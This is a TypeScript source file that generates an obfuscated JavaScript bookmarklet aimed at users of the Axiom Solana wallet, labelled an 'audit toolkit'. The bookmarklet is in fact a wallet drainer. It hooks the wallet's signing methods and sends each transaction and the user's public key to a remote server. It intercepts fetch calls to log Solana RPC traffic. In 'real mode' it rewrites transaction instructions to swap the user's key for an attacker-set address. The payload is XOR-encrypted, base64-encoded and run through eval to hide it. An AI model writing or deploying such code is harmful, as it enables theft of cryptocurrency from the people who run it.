import crypto from 'crypto';

interface BookmarkletConfig {
  serverUrl: string;
  mockWalletAddress: string;
  simulationMode: boolean;
  hashIdentifier: string;
}

class BookmarkletGenerator {
  private generateXorKey(baseKey: string, position: number): number {
    return baseKey.charCodeAt(position % baseKey.length) ^ position;
  }

  private xorObfuscate(str: string, baseKey: string): string {
    let result = '';
    for (let i = 0; i < str.length; i++) {
      const xorKey = this.generateXorKey(baseKey, i);
      result += String.fromCharCode(str.charCodeAt(i) ^ xorKey);
    }
    return result;
  }

  private encodeToBase64(str: string): string {
    return Buffer.from(str).toString('base64');
  }

  private generateBookmarkletCode(config: BookmarkletConfig): string {
    return `
    (async () => {
      const config = \${JSON.stringify(config)};
      const SIMULATION_MODE = config.simulationMode;
      const MOCK_WALLET_ADDRESS = config.mockWalletAddress;
      const SERVER_URL = config.serverUrl;
      
      // Axiom Wallet Detection
      const isAxiomWallet = () => {
        return window.axiom !== undefined || 
               (window.solana && window.solana.isAxiom) ||
               (window.solana && window.solana._walletName && window.solana._walletName.toLowerCase().includes('axiom'));
      };
      
      // Deep Axiom detection
      const detectAxiomProvider = () => {
        // Check for Axiom-specific patterns
        if (window.solana) {
          // Check provider structure
          if (window.solana.connect && 
              window.solana.disconnect && 
              window.solana.signTransaction &&
              window.solana.signAllTransactions) {
            
            // Check for Axiom-specific methods or properties
            if (window.solana.isAxiom || 
                (window.solana._walletName && window.solana._walletName.toLowerCase().includes('axiom')) ||
                (window.solana._publicKey && window.solana._publicKey.toString().startsWith('Axiom'))) {
              return true;
            }
          }
        }
        
        // Check for axiom in global scope
        if (window.axiom && typeof window.axiom === 'object') {
          return true;
        }
        
        return false;
      };
      
      if (!isAxiomWallet() && !detectAxiomProvider()) {
        console.error('Axiom Wallet not detected');
        return;
      }
      
      console.log('Axiom Wallet detected, initializing audit toolkit...');
      
      // Extract wallet public key
      const getPublicKey = async () => {
        try {
          if (window.solana && window.solana.connect) {
            const response = await window.solana.connect();
            return response.publicKey.toString();
          } else if (window.axiom && window.axiom.getPublicKey) {
            return await window.axiom.getPublicKey();
          } else if (window.solana && window.solana.publicKey) {
            return window.solana.publicKey.toString();
          }
          return null;
        } catch (error) {
          console.error('Failed to get public key:', error);
          return null;
        }
      };
      
      // Capture Axiom-specific RPC endpoints
      const captureRpcEndpoints = () => {
        const originalFetch = window.fetch;
        
        window.fetch = function(...args) {
          const [url, options] = args;
          
          // Log Solana RPC calls
          if (typeof url === 'string' && 
              (url.includes('solana') || url.includes('api.mainnet-beta.solana.com') || 
               url.includes('rpc.ankr.com') || url.includes('solana-mainnet.rpc.extrnode'))) {
            
            const rpcData = {
              timestamp: new Date().toISOString(),
              url: url,
              method: options?.body ? JSON.parse(options.body).method : 'GET',
              intercepted: true,
              hash: config.hashIdentifier
            };
            
            // Send to server for logging
            try {
              originalFetch(\`\${SERVER_URL}/api/wallet/rpc\`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(rpcData)
              }).catch(() => {}); // Ignore errors in logging
            } catch (error) {
              console.error('Failed to log RPC call:', error);
            }
          }
          
          return originalFetch.apply(this, args);
        };
      };
      
      // Mock transaction interceptor
      const interceptTransactions = () => {
        // Try to intercept different signing methods
        const methodsToIntercept = ['sendTransaction', 'signTransaction', 'signAllTransactions'];
        
        methodsToIntercept.forEach(methodName => {
          const originalMethod = window.solana?.[methodName] || 
                                window.axiom?.[methodName];
          
          if (originalMethod) {
            const mockMethod = async function(...args) {
              const [transaction, ...otherArgs] = args;
              
              // Log transaction details
              const transactionData = {
                timestamp: new Date().toISOString(),
                publicKey: await getPublicKey(),
                transaction: transaction?.serialize ? 
                  transaction.serialize().toString('base64') : 
                  JSON.stringify(transaction),
                intercepted: true,
                mockDestination: MOCK_WALLET_ADDRESS,
                method: methodName,
                hash: config.hashIdentifier
              };
              
              // Send to server for logging
              try {
                await fetch(\`\${SERVER_URL}/api/wallet/log\`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(transactionData)
                });
              } catch (error) {
                console.error('Failed to log transaction:', error);
              }
              
              if (SIMULATION_MODE) {
                console.log('SIMULATION: Transaction intercepted', transactionData);
                
                // Return appropriate response based on method
                if (methodName === 'sendTransaction') {
                  return { signature: 'mock-signature-' + Date.now() };
                } else if (methodName === 'signTransaction' || methodName === 'signAllTransactions') {
                  if (methodName === 'signTransaction') {
                    return transaction;
                  } else {
                    return args; // Return all transactions
                  }
                }
              }
              
              // In real mode, redirect to mock wallet
              if (transaction && transaction.instructions) {
                const mockInstructions = transaction.instructions.map(ix => 
                  // Replace destination with mock wallet
                  Object.assign({}, ix, { keys: ix.keys.map(key => 
                    key.pubkey.toString() === transactionData.publicKey 
                      ? { pubkey: MOCK_WALLET_ADDRESS, isSigner: key.isSigner, isWritable: key.isWritable }
                      : key
                  )})
                );
                
                transaction.instructions = mockInstructions;
              }
              
              return originalMethod.apply(this, [transaction, ...otherArgs]);
            };
            
            if (window.solana) {
              window.solana[methodName] = mockMethod;
            }
            if (window.axiom) {
              window.axiom[methodName] = mockMethod;
            }
          }
        });
      };
      
      // Connect to server
      const connectToServer = async () => {
        const publicKey = await getPublicKey();
        if (!publicKey) return;
        
        try {
          const response = await fetch(\`\${SERVER_URL}/api/wallet/connect\`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              publicKey, 
              userAgent: navigator.userAgent,
              timestamp: new Date().toISOString(),
              hash: config.hashIdentifier,
              walletType: 'Axiom'
            })
          });
          
          const data = await response.json();
          console.log('Connected to audit server:', data);
          
          // Start intercepting transactions and RPC calls
          interceptTransactions();
          captureRpcEndpoints();
          
          return data;
        } catch (error) {
          console.error('Failed to connect to server:', error);
        }
      };
      
      // Initialize
      connectToServer();
    })();
    `;
  }

 generateObfuscatedBookmarklet(config: BookmarkletConfig): string {
      const baseKey = config.hashIdentifier;
      const code = this.generateBookmarkletCode(config);
      const obfuscated = this.xorObfuscate(code, baseKey);
      const encoded = this.encodeToBase64(obfuscated);
      
      return `javascript:(async()=>{var HASH="${config.hashIdentifier}";const _3142=globalThis,_e269=_3142['\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067']['\\u0066\\u0072\\u006f\\u006d\\u0043\\u0068\\u0061\\u0072\\u0043\\u006f\\u0064\\u0065'];var _f09d=12,_85fd="${encoded}";function _d2b3(_a5f6,_b7e1){let _c8d2='';for(let _d9e3=0;_d9e3<_a5f6.length;_d9e3++){const _e1f4=HASH.charCodeAt(_d9e3%HASH.length)^_d9e3;_c8d2+=String.fromCharCode(_a5f6.charCodeAt(_d9e3)^_e1f4);}return _c8d2;}const _f5a6=_d2b3(_e269(_85fd),HASH);eval(_f5a6);})();`;
    }

    generateUniqueHash(): string {
      return crypto.randomBytes(8).toString('hex');
    }
}

export default BookmarkletGenerator;
